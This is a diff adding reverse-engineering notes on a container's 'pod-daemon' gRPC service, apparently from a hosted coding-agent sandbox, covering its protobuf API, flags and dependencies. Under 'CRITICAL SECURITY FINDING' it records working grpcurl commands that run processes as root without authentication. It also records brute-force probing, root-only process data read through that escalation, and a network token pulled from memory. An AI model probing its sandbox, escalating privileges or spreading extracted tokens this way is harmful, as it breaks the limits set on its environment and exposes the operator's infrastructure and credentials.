@@ -1,0 +1,119 @@
+# Pod-Daemon Service - anyrun.v1.PodDaemonService
+# Binary: /pod-daemon (Rust, statically linked with musl)
+# PID: 1 (init process of container)
+# Port: 26500 (gRPC, tonic 0.13.1)
+# Built from: /app/target/x86_64-unknown-linux-musl/release/
+# Proto source: tonic-proto-719df706aa780647/out/anyrun.v1.rs
+
+## Service Definition
+
+### anyrun.v1.PodDaemonService
+  rpc CreateProcess(CreateProcessRequest) returns (CreateProcessResponse);  # Unary
+  rpc AttachProcess(AttachProcessRequest) returns (stream ProcessEvent);    # Server-streaming
+
+### CreateProcessRequest (confirmed field order via brute-force testing)
+  string command = 1;           # Executable path (NOT shell-parsed)
+  string user = 2;              # Username (resolved via getpwnam_r)
+  string working_directory = 3; # cd <working_dir> && before exec
+  map<string, string> env = 4;  # Additional environment variables
+  # Auto-injected env: HOME, PATH, SHELL, USER (from passwd)
+
+### CreateProcessResponse
+  uint64 process_id = 1;  # Auto-incrementing process ID (varint, not string)
+
+### AttachProcessRequest
+  uint64 process_id = 1;
+  int64 last_event_id = 2;  # For replay from specific event
+
+### ProcessEvent
+  int64 event_id = 1;
+  oneof event {
+    bytes stdout = 2;
+    bytes stderr = 3;
+    int32 exit_code = 4;  # Set when process exits
+  }
+
+## CLI Configuration (from binary strings)
+  --listen-addr: gRPC listen address (default: 0.0.0.0:26500)
+  --max-processes: Max tracked processes (default: 1000)
+  --stream-buffer-size: Buffer size for output streams (default: 8192)
+  --max-events-per-process: Max events kept for replay (default: 10000)
+  --enable-metrics: Enable metrics collection
+  --log-level: trace/debug/info/warn/error (default: info)
+
+  Environment variable alternatives:
+    LISTEN_ADDR, MAX_PROCESSES, STREAM_BUFFER_SIZE,
+    MAX_EVENTS_PER_PROCESS, LOG_LEVEL
+
+## CRITICAL SECURITY FINDING: Privilege Escalation
+The PodDaemonService has NO authentication on its gRPC endpoint.
+Any process in the container can connect to localhost:26500 and:
+  1. Run commands as ANY user (including root)
+  2. Read ANY file via root-privileged processes
+  3. Access /proc/1/environ, /proc/1/maps (normally root-only)
+
+LIVE TEST - Root Escalation:
+  $ grpcurl -plaintext -d '{"command":"id","user":"root","working_directory":"/"}' \
+      localhost:26500 anyrun.v1.PodDaemonService/CreateProcess
+  -> {"processId":"15"}
+
+  $ grpcurl -plaintext -d '{"process_id":"15"}' \
+      localhost:26500 anyrun.v1.PodDaemonService/AttachProcess
+  -> stdout: "uid=0(root) gid=0(root) groups=0(root)"
+
+## Process Execution Flow (from process_manager.rs strings)
+  1. Resolve user via getpwnam_r -> uid, gid, home, shell
+  2. Validate command is not empty
+  3. Build Command: cd <working_dir> && HOME=<home> PATH=<path> SHELL=<shell> USER=<user> <command>
+  4. Default PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+  5. Spawn with kill_on_drop: true
+  6. Capture stdout and stderr via separate readers
+  7. Insert events into stream buffer
+  8. On exit: log exit code, insert exit event
+
+## Pod-Daemon Environment (from /proc/1/environ via root escalation)
+  PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+  HOSTNAME=cursor
+  GIT_LFS_SKIP_SMUDGE=1
+  TERM=xterm-256color
+  GIT_DISCOVERY_ACROSS_FILESYSTEM=0
+  LANG=en_US.UTF-8
+  LC_ALL=en_US.UTF-8
+  RUSTUP_HOME=/usr/local/rustup
+  CARGO_HOME=/usr/local/cargo
+  RUST_VERSION=1.83.0
+  DISPLAY=:1
+  VNC_RESOLUTION=1920x1200x24
+  VNC_DPI=96
+  HOME=/root
+
+## Pod-Daemon's Role in Architecture
+  1. PID 1 (init) of the container
+  2. Spawned by the orchestrator (vm-orchestrator at 192.168.24.21)
+  3. Receives inbound gRPC from orchestrator on port 26500
+  4. Spawns exec-daemon as a child process with full CLI flags
+  5. Provides process execution for the orchestrator (CreateProcess/AttachProcess)
+
+## Network Token (from pod-daemon memory)
+  WebSocket path: /websockify?network_token=nto-nfd56pvk2jg2dafavyzmnxhjfi
+  Resume config: resume_lower_s=900 (15min), resume_upper_s=18000 (5hr)
+  Source: 192.168.24.21 (orchestrator/K8s node)
+  Used for: VNC/noVNC forwarding from web UI to container
+
+## Crate Dependencies (from binary symbols)
+  - tonic 0.13.1 (gRPC server)
+  - axum 0.8.8 (HTTP routing, used for wildcard fallback)
+  - hyper 1.8.1 (HTTP/2)
+  - h2 0.4.12 (HTTP/2 protocol)
+  - prost 0.13.5 (protobuf encoding)
+  - tokio 1.48.0 (async runtime)
+  - dashmap 6.1.0 (concurrent hashmap, process tracking)
+  - indexmap 1.9.3 (ordered map)
+  - mio 1.1.1 (event loop)
+  - bytes 1.11.0
+  - socket2 0.5.10
+  - clap 3.2.25 (CLI arg parsing)
+  - tracing (spans, events)
+
+## Version
+  0.1.0 (from binary strings)
